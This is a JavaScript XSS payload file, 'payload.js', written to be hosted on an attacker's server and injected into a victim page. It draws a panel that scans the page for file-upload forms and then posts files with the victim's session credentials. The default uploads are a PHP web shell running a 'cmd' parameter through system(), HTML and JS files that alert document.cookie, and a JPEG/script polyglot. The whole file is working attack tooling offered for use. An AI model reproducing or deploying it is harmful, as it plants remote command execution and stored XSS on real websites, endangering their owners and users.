// payload.js - Host this on your external server
(function() {
    if(document.getElementById('xss-panel')) return;
    
    const p = document.createElement('div');
    p.id = 'xss-panel';
    p.innerHTML = `<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
background:#fff;border:3px solid #f00;padding:20px;z-index:9999;width:350px;font-family:monospace;
box-shadow:0 0 20px #000;">
<h3 style="margin:0 0 15px">📁 XSS Uploader</h3>
<input id="upUrl" placeholder="Upload URL" value="/upload.php" style="width:100%;margin-bottom:10px">
<input id="upField" placeholder="Field name" value="file" style="width:100%;margin-bottom:10px">
<select id="upType" style="width:100%;margin-bottom:10px">
<option value="php">PHP Shell</option><option value="html">HTML XSS</option>
<option value="js">JavaScript</option><option value="jpg">JPG Payload</option>
</select>
<textarea id="upCustom" placeholder="Custom code" style="width:100%;height:60px;margin-bottom:10px"></textarea>
<div style="display:flex;gap:5px">
<button onclick="upUpload()" style="flex:2;padding:8px;background:#4CAF50;color:#fff;border:none">Upload</button>
<button onclick="upScan()" style="flex:1;padding:8px;background:#2196F3;color:#fff;border:none">Scan</button>
<button onclick="this.parentElement.parentElement.remove()" style="padding:8px;background:#f44336;color:#fff;border:none">X</button>
</div>
<div id="upStatus" style="margin-top:10px;padding:5px;background:#f0f0f0;max-height:120px;overflow:auto">Ready</div>
</div>`;
    document.body.appendChild(p);
    
    window.upScan = () => {
        const s = document.getElementById('upStatus');
        s.innerHTML = 'Scanning...<br>';
        document.querySelectorAll('form').forEach(f => {
            const i = f.querySelector('input[type="file"]');
            if(i) s.innerHTML += `✅ ${f.action || 'same'}: ${i.name}<br>`;
        });
    };
    
    window.upUpload = async () => {
        const url = document.getElementById('upUrl').value;
        const field = document.getElementById('upField').value;
        const type = document.getElementById('upType').value;
        const custom = document.getElementById('upCustom').value;
        let content, name, mime;
        
        if(type == 'php') {
            content = custom || '<?php system($_REQUEST["cmd"]); ?>';
            name = 'shell.php';
            mime = 'application/x-php';
        } else if(type == 'html') {
            content = custom || '<script>alert("XSS:"+document.cookie)</script>';
            name = 'xss.html';
            mime = 'text/html';
        } else if(type == 'js') {
            content = custom || 'alert("XSS")';
            name = 'xss.js';
            mime = 'application/javascript';
        } else {
            content = custom || 'FFD8FFE0/*<script>alert("XSS")</script>*/';
            name = 'image.jpg';
            mime = 'image/jpeg';
        }
        
        const fd = new FormData();
        fd.append(field, new File([new Blob([content],{type:mime})], name, {type:mime}));
        
        const s = document.getElementById('upStatus');
        s.innerHTML = `Uploading...<br>`;
        
        try {
            const r = await fetch(url, {method:'POST', body:fd, credentials:'include'});
            if(r.ok) {
                const t = await r.text();
                s.innerHTML += `✅ Success!<br>`;
                const m = t.match(/(https?:\/\/[^\s"']+\.(php|html|js|jpg))/i);
                if(m) s.innerHTML += `📁 ${m[0]}<br>`;
            } else s.innerHTML += `❌ ${r.status}<br>`;
        } catch(e) { s.innerHTML += `❌ Error<br>`; }
    };
})();
